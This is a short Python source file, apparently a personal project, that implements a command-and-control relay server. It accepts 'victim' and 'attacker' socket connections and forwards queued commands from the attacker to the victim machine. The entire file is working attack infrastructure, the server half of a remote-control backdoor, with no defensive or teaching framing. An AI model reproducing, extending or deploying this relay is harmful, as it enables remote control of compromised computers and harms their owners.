# Writer: Gal Harari
# Date: 28/11/2019
from globals import *
import socket
from multiprocessing import Queue
import threading

cmd_queue = Queue()


def handle_victim_conn(s: socket.socket):
    global cmd_queue

    while True:
        try:
            if not cmd_queue.empty():
                cmd = cmd_queue.get()
                print(f'Sending command {cmd}')
                s.send(cmd)
        except ConnectionResetError as e:
            s.close()
            return


def handle_attacker_conn(att_conn: socket.socket):
    global cmd_queue

    while True:
        try:
            cmd_got = att_conn.recv(CMD_SIZE)
            print(f'Got command {cmd_got}')
            cmd_queue.put(cmd_got)
        except ConnectionResetError as e:
            att_conn.close()
            return


if __name__ == '__main__':
    server_socket = socket.socket()
    server_socket.bind(('', SERVER_PORT))

    conn_num = 0
    max_conn_num = 2

    with server_socket:
        server_socket.listen(max_conn_num)
        while True:
            # if conn_num >= max_conn_num:
            #     continue

            (conn, addr) = server_socket.accept()

            conn_num += 1

            conn_input = (conn.recv(ID_LEN)).decode()

            conn.send(OK_SIGNAL.encode())

            if conn_input[0:ID_LEN] == VICTIM_ID:
                vic_thread = threading.Thread(target=handle_victim_conn,
                                              name='victim '
                                                   'thread',
                                              args=(conn,))

                vic_thread.start()

            elif conn_input[0:ID_LEN] == ATTACKER_ID:
                att_thread = threading.Thread(target=handle_attacker_conn,
                                              name='attacker '
                                                   'thread',
                                              args=(conn,))

                att_thread.start()

            else:
                conn.send(
                    (f'I wanna know, are you the victim (\"{VICTIM_ID}\") or '
                     f'attacker (\"{ATTACKER_ID}\")?').encode())
